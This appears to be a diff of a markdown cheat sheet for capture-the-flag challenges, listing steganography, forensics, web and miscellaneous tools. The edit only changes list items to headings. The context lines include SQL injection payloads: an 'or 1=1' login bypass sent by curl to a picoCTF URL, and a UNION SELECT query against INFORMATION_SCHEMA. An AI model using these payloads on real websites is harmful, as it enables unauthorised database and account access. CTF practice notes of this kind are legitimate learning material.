@@ -5,7 +5,7 @@ HERE ARE SOME EXTREMELY USEFUL TOOLS AND COMMANDS
 ### [Web](#web)
 ### [Misc](#misc)
 
-- <a name = "linux">Basic linux tools and Commands</a>
+## <a name = "linux">Basic linux tools and Commands</a>
 * binwalk -e <filenam> : //Extracts hidden files
 * steghide extract -sf <filename> : //Extracts hidden text in the image
 * xxd <file name> : //Prints the Hex version of file
@@ -28,7 +28,7 @@ we can see all files running in the process with given process id.
 * zsteg :- another great stego tool
 * john the ripper :- tool for password cracking
 
-- <a name = "web">Web</a>
+## <a name = "web">Web</a>
 * curl "https://2019shell1.picoctf.com/problem/4162/login.php" --data "username=admin&password='+or+1=1--" && echo 
 this command will find the password to username admin stored in database.
 * Robots -->>> url/robots.txt (shows hidden info)
@@ -36,7 +36,7 @@ this command will find the password to username admin stored in database.
 * 1 union select 1,TABLE_NAME, 3,4 from INFORMATION_SCHEMA.TABLES     input this code in the info bar of a website for sql attack using injection.
 *  Postman great tool for web challs
 
-- <a name = "misc">Misc</a>
+## <a name = "misc">Misc</a>
 * Esoteric languages(pikalang, 2dfuck, brainfuck) use tio.run website, Malboge an esoteric language that looks like base 85.
 *  git show -1 filename.txt > to compare against the last revision of file
    git show -2 filename.txt > to compare against the 2nd last revision of file
